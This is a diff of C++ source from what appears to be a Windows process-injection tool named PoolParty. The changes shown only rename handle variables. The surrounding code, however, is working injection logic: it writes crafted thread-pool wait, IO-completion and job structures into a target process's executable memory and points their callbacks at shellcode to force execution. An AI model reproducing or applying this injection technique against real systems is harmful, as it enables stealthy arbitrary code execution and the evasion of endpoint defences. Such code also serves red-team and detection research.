@@ -147,14 +147,14 @@ void RemoteWaitCallbackInsertion::SetupExecution()
 	WriteMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
 
 	/* Create dispatcher object */
-	auto hEvent = w_CreateEvent(NULL, FALSE, FALSE, NULL);
+	auto p_hEvent = w_CreateEvent(NULL, FALSE, FALSE, NULL);
 
 	/* Associate dispatcher object with the worker factory IO completion port */
-	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, NULL);
+	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, *p_hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, NULL);
 
 	/* Trigger dispatcher object making NtWaitForWorkViaWorkerFactory receiving our specially crafted wait & direct */
 	// TODO: Should it be a wrapper?
-	SetEvent(hEvent);
+	SetEvent(*p_hEvent);
 }
 
 RemoteWaitCallbackInsertion::~RemoteWaitCallbackInsertion()
@@ -178,10 +178,10 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution()
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 
 	/* Create the file to associate with the IO completion */
-	auto hFile = w_CreateFile(L"PoolParty_Invitation.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+	auto p_hFile = w_CreateFile(L"PoolParty_Invitation.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
 	/* Create a TP_IO */
-	auto pTpIo = w_CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress, NULL, NULL);
+	auto pTpIo = w_CreateThreadpoolIo(*p_hFile, (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 
 	// TODO: Should be filled by w_CreateThreadpoolIo
 	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;
@@ -198,7 +198,7 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution()
 	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
 	FileIoCopmletionInformation.Port = *p_hIoCompletion;
 	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
-	w_ZwSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), 61); // TODO: Export 0x3D to enum
+	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), 61); // TODO: Export 0x3D to enum
 
 	/* Trigger execution */
 	// TODO: Use std::string instead of C char
@@ -209,7 +209,7 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution()
 		"We'll turn up the heat and let the good times pour!\n";
 	auto szBufferLength = strlen(cBuffer);
 	OVERLAPPED Overlapped = { 0 };
-	w_WriteFile(hFile, cBuffer, szBufferLength, NULL, &Overlapped);
+	w_WriteFile(*p_hFile, cBuffer, szBufferLength, NULL, &Overlapped);
 }
 
 RemoteIoCompletionCallbackInsertion::~RemoteIoCompletionCallbackInsertion()
@@ -327,10 +327,10 @@ void RemoteJobCallbackInsertion::SetupExecution() {
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 
 	/* Create a job object */
-	auto hJob = w_CreateJobObject(NULL, NULL);
+	auto p_hJob = w_CreateJobObject(NULL, NULL);
 
 	/* Allocate TP_JOB */
-	auto pTpJob = w_TpAllocJobNotification(hJob, m_ShellcodeAddress, NULL, NULL);
+	auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, NULL, NULL);
 
 	/* Write the TP_JOB to the target process */
 	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -339,16 +339,16 @@ void RemoteJobCallbackInsertion::SetupExecution() {
 	/* Zero out the IO completion port information of the job object */
 	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
 
-	w_SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
+	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
 
 	/* Associate the job object with the IO completion of the target worker factory */
 	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
 	JobAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
 
-	w_SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
+	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
 
 	/* Trigger execution by adding a process to the job object */
-	w_AssignProcessToJobObject(hJob, GetCurrentProcess());
+	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
 
 }
 
